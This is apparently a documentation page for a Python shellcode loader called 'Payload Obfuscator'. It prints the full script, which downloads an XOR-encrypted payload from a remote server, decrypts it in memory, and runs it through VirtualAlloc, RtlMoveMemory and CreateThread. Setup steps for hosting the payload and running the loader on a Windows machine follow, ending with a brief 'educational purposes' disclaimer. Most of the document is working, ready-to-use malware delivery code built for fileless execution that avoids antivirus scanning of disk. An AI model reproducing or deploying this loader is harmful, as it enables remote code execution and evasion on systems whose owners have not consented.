---
description: >-
  Python script that downloads XOR-encrypted payloads, decrypts them at runtime,
  and executes them directly in memory via Windows API calls.
---

# Payload Obfuscator

Check it out - [payload\_obfuscator.py](payload_obfuscator.py)

<details>

<summary>payload_obfuscator.py</summary>

```python
import requests
import ctypes


def xor_decrypt(data, key):
    return bytes([b ^ key for b in data])


# Download the encrypted shellcode
url = '<ip>/<payload-name>'
response = requests.get(url, allow_redirects=True)

if response.status_code == 200:
    print("Encrypted shellcode downloaded successfully")
    encrypted_shellcode = response.content

else:
    print("Failed to download shellcode")
    exit(0)

# Decrypt shellcode
key = 0x41
shellcode = xor_decrypt(encrypted_shellcode, key)

# Allocate memory
ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)

# Copy the shellcode into the memory
ctypes.windll.kernel32.RtlMoveMemory(None, shellcode, len(shellcode))

# Execute shellcode
ht = ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)

ctypes.windll.kernel32.WaitForSingleObject(ht, -1)

```

</details>

#### Features

* **Payload Encryption** – Uses XOR-based encryption to protect payloads in transit.
* **Downloader** – Retrieves the encrypted payload from a remote HTTP server.
* **Decryption at Runtime** – Decrypts payloads only in memory, never writing them to disk.
* **Windows API Integration** – Leverages `VirtualAlloc`, `RtlMoveMemory`, and `CreateThread` through Python’s `ctypes`.
* **Memory-Only Execution** – Executes the payload directly in allocated memory.

***

#### Requirements

* **Operating System**: Windows (needed for Windows API calls through `ctypes`)
* **Python Version**: Python 3.8 or later
* **Libraries**:
  * `requests` → for downloading the encrypted payload
  * `ctypes` → comes built-in with Python, used for calling Windows API functions

***

#### Installation

Before running the project, install the required library using:

```
pip install requests
```

***

#### Setup and Usage

1. **Prepare the Encrypted Payload**
   * Encrypt your payload using the same XOR key defined in the script.
   * Save it as `encrypted_shellcode.bin`.
2. **Start a Local HTTP Server**
   * Place the encrypted payload in a directory.
   *   Start a Python HTTP server to host it:

       ```
       python -m http.server 8000
       ```
3. **Configure the Script**
   * Update the `url` variable inside `encrypt_downloader.py` with the server’s IP address and port.
   *   Example:

       ```
       url = 'http://192.168.31.230:8000/encrypted_shellcode.bin'
       ```
4. **Run the Script**
   *   Execute the script on the Windows system:

       ```
       python encrypt_downloader.py
       ```
5. **Observe Execution**
   * The script downloads, decrypts, and executes the payload directly in memory.

***

#### Disclaimer

This tool is intended for educational and ethical testing purposes only.\
Do **not** use it on networks or systems you don’t own or have explicit permission to test.
